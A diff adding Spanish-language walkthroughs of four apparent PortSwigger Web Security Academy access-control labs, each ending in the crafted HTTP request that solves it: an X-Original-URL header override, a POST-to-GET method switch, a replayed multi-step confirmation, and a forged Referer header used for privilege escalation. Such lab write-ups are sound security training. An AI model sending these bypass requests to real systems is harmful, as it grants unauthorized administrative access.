@@ -109,4 +109,64 @@ Hal Pline: Yes it is!
 You: Ok thanks, bye!
 ```
 
-## Reto 10: 
+## Reto 10: Se puede eludir el control de acceso basado en URL
+
+Este sitio web tiene un panel de administración no autenticado en /admin, pero se ha configurado un sistema front-end para bloquear el acceso externo a esa ruta. Sin embargo, la aplicación back-end se basa en un marco que admite X-Original-URL encabezado.
+
+Para resolver el laboratorio, acceda al panel de administración y elimine el usuario. carlos. 
+
+El sistema bloquea el acceso directo a /admin, pero al modificar la cabecera ‘X-Original-URL‘ desde Burp, el backend interpreta esta ruta ignorando el filtrado del frontend. Aprovechamos esta característica para acceder primero al panel y luego invocamos ‘/admin/delete?username=carlos‘ usando la misma técnica para eliminar al usuario.
+
+```
+GET /?username=carlos HTTP/2
+X-Original-Url: /admin/delete
+```
+
+## Reto 11: El control de acceso basado en métodos se puede eludir
+
+Este laboratorio implementa controles de acceso basados ​​parcialmente en el método HTTP de solicitudes. Puede familiarizarse con el panel de administración iniciando sesión con sus credenciales. administrator:admin.
+
+Para resolver el laboratorio, inicie sesión con las credenciales wiener:peter y explotar los controles de acceso defectuosos para promocionarse como administrador.
+
+La aplicación diferencia los permisos según el método HTTP. Observamos que un POST necesita privilegios, pero al cambiar el método a GET, el backend sigue procesando la solicitud sin aplicar el control adecuado. Al interceptar la petición original desde Burp y cambiar el método a GET, es posible promocionar a nuestro usuario sin ser administrador, aprovechando una validación deficiente basada únicamente en el verbo HTTP
+
+
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: 0a53007703fbbcd68068ada10055007d.web-security-academy.net
+Cookie: session=3fd7Do43SdJdex1HQpj35M4KRgffCCI5
+```
+
+## Reto 12: Proceso de varios pasos sin control de acceso en un paso
+
+Este laboratorio tiene un panel de administración con un proceso de varios pasos defectuoso para cambiar el rol de un usuario. Puede familiarizarse con el panel de administración iniciando sesión con las credenciales. administrator:admin.
+
+Para resolver el laboratorio, inicie sesión con las credenciales wiener:peter y explotar los controles de acceso defectuosos para promocionarse como administrador. 
+
+En esta lección observamos cómo una promoción de roles en la sección de administración requiere varias etapas.
+
+Aunque la primera fase valida permisos, la segunda no lo hace correctamente. Al interceptar la solicitud de confirmación en Burp y reutilizarla con nuestra propia sesión y usuario, logramos promocionarnos a administrador sin tener privilegios.
+
+```
+POST /admin-roles HTTP/2
+Host: 0a1f001c048a810b803ec199009700ee.web-security-academy.net
+Cookie: session=AfnaVcqDwVlFqKKqmPXZQkHOzsMebSxr --> Cookie de wiener
+action=upgrade&confirmed=true&username=wiener
+```
+
+## Reto 13: Control de acceso basado en referentes
+
+Este laboratorio controla el acceso a ciertas funciones de administración según el encabezado Referer. Puede familiarizarse con el panel de administración iniciando sesión con sus credenciales. administrator:admin.
+
+Para resolver el laboratorio, inicie sesión con las credenciales wiener:petery explotar los controles de acceso defectuosos para promocionarse como administrador. 
+
+cómo una aplicación intenta proteger funciones críticas usando el encabezado Referer. Aunque esto puede parecer una capa de seguridad, es fácilmente manipulable.
+
+Aprovechamos esta debilidad para modificar la solicitud en Burp, falsificar el Referer y cambiar nuestro propio rol a administrador sin autorización legítima.
+
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: 0a6200c8030070f980ac8a5e0000006e.web-security-academy.net
+Cookie: session=1jHVHzFV8oppttmRKg0wCJNa7FXuyO3L --> cookie de wiener
+Referer: https://0a6200c8030070f980ac8a5e0000006e.web-security-academy.net/admin --> referer de panel de admin anterior
+```
